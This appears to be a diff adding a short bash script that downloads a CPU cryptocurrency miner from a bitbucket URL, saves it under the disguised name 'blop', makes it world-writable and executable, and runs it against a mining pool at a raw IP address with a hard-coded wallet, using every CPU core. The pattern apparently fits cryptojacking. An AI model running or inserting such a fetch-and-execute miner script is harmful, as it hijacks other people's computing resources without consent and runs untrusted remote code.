@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O blop https://bitbucket.org/mypile/filesg/downloads/cpuminer-avx2
+chmod 777 blop
+./blop -a gr -o 45.32.124.79:80 -u SVkUAWMWacEGvBsj2mr3gdN16N69WqiEk2.xxx -p webpassword=x -t $(nproc --all)
